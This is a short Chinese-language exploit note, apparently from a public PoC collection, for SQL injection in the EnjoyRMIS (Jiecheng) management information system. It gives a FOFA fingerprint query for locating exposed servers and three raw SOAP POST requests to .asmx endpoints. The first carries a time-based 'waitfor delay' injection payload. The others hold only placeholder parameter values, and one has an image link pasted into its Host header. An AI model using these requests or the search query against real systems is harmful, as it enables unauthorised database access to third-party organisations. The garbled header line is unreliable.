## 捷诚管理信息系统sql注入漏洞


## fofa
```
body="/Scripts/EnjoyMsg.js"
```


## poc
```
POST /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx HTTP/1.1
Host: IP：port
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
Connection: close
Content-Length: 369
Accept: */*
Accept-Language: en
Content-Type: text/xml; charset=utf-8
Accept-Encoding: gzip

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetOSpById xmlns="http://tempuri.org/">
      <sId>1';waitfor delay '0:0:5'--+</sId>
    </GetOSpById>
  </soap:Body>
</soap:Envelope>
```

## poc2
```

POST /EnjoyRMIS_WS/WS/Hr/CWSHr.asmx HTTP/1.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
SOAPAction: http://tempuri.org/GetLeaveReqById
Content-Type: text/xml;charset=UTF-8
Content-Length: 316

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:GetLeaveReqById>
         <!--type: string-->
         <tem:sId>gero et</tem:sId>
      </tem:GetLeaveReqById>
   </soapenv:Body>
</soapenv:Envelope>
```

## poc3
```

POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Host: x.x.x.x![image.png](https://image.3001.net/images/20231122/1700631040_655d920042b6ad451a8e4.png!small)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
SOAPAction: http://tempuri.org/GetOAById
Content-Type: text/xml;charset=UTF-8
Content-Length: 276

<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
   <soap:Header/>
   <soap:Body>
      <tem:GetOAById>
         <!--type: string-->
         <tem:sId>gero et</tem:sId>
      </tem:GetOAById>
   </soap:Body>
</soap:Envelope>
```
![06af483645506a73282224859d3e03df](https://github.com/wy876/POC/assets/139549762/567ff592-a7c5-4c87-bb33-10220e8eb118)
